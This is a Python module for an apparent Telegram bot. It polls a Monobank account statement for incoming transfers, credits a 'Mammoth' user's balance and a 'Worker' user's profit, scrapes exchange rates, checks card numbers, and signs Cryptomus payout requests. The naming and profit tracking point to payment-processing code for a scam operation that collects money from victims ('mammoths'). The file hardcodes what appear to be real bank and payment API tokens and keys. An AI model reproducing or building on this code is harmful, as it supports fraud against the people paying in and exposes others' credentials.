import requests
from bs4 import BeautifulSoup
import hashlib
import base64
from mamonts import show_all_currencies
import json
import uuid
token = 'u3dL8d8BJIbUvxNFME1wIOOGdb6BDWUlnX3_Zc9976dc'
import datetime
import time
from db import session as session_db
from db import Mammoth, Worker, Payouts
# Создайте объект datetime для указанной даты и времени
date_time = datetime.datetime(2023, 8, 15, 23, 14)

# Преобразуйте в UNIX времени
unix_timestamp = int(date_time.timestamp())
header = {'X-Token':token}

import aiohttp
import asyncio


async def waiting_for_mamont_async(unix_timestamp, min_amount, token, service_id, message):
    usd_to_uah = fetch_usd_to_uah_currency()
    mammonth = session_db.query(Mammoth).filter(Mammoth.telegram_id == message.from_user.id).first()
    worker = session_db.query(Worker).filter(Worker.telegram_id == mammonth.belongs_to_worker).first()
    start_time = time.time()

    header = {'X-Token': token}
    interval_seconds = 20
    duration_seconds = 900

    async with aiohttp.ClientSession(headers=header) as session:
        while (time.time() - start_time) < duration_seconds:
            async with session.get(f'https://api.monobank.ua/personal/statement/wxgvgkFSeH5B9FHP9RtPPQ/{unix_timestamp}/') as resp:
                try:

                    print(min_amount)
                    data = await resp.json()
                    print(data)
                    for transaction in data:
                        print(transaction)

                        if transaction['comment'] == str(service_id) :
                            amount_in_uah  = ((min_amount/float(await fetch_usd_to_rub_currency()))*await fetch_usd_to_uah_currency())/100
                            print(amount_in_uah)
                            if  0.95*min_amount <= amount_in_uah:
                                mammonth.balance += min_amount
                                worker.profit += min_amount
                                worker.profit_quantity += 1
                                session_db.commit()
                                await message.answer(f'Вы успешно пополнили свой баланс на {min_amount} рублей.')
                                return

                            return
                except Exception as ex:
                    print(ex)

            await asyncio.sleep(interval_seconds)
        await message.answer('Вы не пополнили счет в течени 15 минут. При неполодках - обращайтесь в тех.поддержку')

async def get_crypto_price_async( crypto_symbol):
    async with aiohttp.ClientSession() as session:
        url = f'https://api.coinbase.com/v2/prices/{crypto_symbol}-USD/spot'
        async with session.get(url) as response:
            if response.status == 200:
                data = await response.json()
                return data['data']['amount']
            else:
                return None


async def fetch_usd_to_rub_currency():
    async with aiohttp.ClientSession() as session:
        url = 'https://minfin.com.ua/currency/converter/1-usd-to-rub/'
        async with session.get(url) as response:
            if response.status == 200:
                html = await response.text()
                soup =  BeautifulSoup(html)

                value = soup.select('#root > div > section > div > div > div > section:nth-child(1) > header > div.sc-1xlibvr-0.hSIwaV > div.sc-1xlibvr-2.ePvvEL > div:nth-child(3) > div.zlkj5-0.kIZRLg > label > input')[0]['value']
                return value
            else:
                return None

def is_valid_credit_card(card_number):
    # Удаление пробелов и дефисов из номера карты
    card_number = card_number.replace(" ", "").replace("-", "")

    # Проверка, является ли номер карты числовым
    if not card_number.isdigit():
        return False

    # Алгоритм Луна (алгоритм Modulus 10)
    total = 0
    reverse_digits = card_number[::-1]

    for i, digit in enumerate(reverse_digits):
        if i % 2 == 1:
            double_digit = int(digit) * 2
            if double_digit > 9:
                double_digit -= 9
            total += double_digit
        else:
            total += int(digit)

    return total % 10 == 0



async def cryptomus(data:dict, url:str):
    encoded_data = base64.b64encode(
        json.dumps(data).encode("utf-8")
    ).decode("utf-8")
    merchant ='f6771c05-4fb6-4080-b67b-241dd1ca864c'
    key = 'mHc0WYZGw4dK67nkkHkkUbFv8mVWzUxFdN8HU5yU7DOOQ95iSmMAZ0fq5Ld00h1CpjA3es4AzCQ4LZYqenXnKhOcocln6zSaBO4B5zQVP9HEPRXwdGZ0tuscImdMkPjv'
    if url == 'https://api.cryptomus.com/v1/payout':
        key = 'v3iCEi27CxbNFSkPJCn2dnlRospRw7AiZktqpMINhM0npVmJvYtSAVr4uyyMxRS7mPAlSiFGVfeJEJIRN1vzlYMT814O8ILUondkcAwqxpeDu3csX7nii0Brc9lEuK2d'
    signature = hashlib.md5(f"{encoded_data}{key}".
                            encode("utf-8")).hexdigest()

    async with aiohttp.ClientSession(headers={
        "merchant": merchant,
        "sign": signature,
    }) as session:
        async with session.post(url=url, json=data) as response:

            if not response.ok:
                raise ValueError(response.reason)

            return await response.json()



async def fetch_usd_to_uah_currency():
    async with aiohttp.ClientSession() as session:
        async with session.get('https://minfin.com.ua/currency/converter/1-usd-to-uah/') as resp:
            text = await resp.text()
            soup = BeautifulSoup(text)
            value = soup.select('#root > div > section > div > div > div > section:nth-child(1) > header > div.sc-1xlibvr-0.hSIwaV > div.sc-1xlibvr-2.ePvvEL > div:nth-child(3) > div.zlkj5-0.kIZRLg > label > input'
                )
            return float(value[0]['value'])



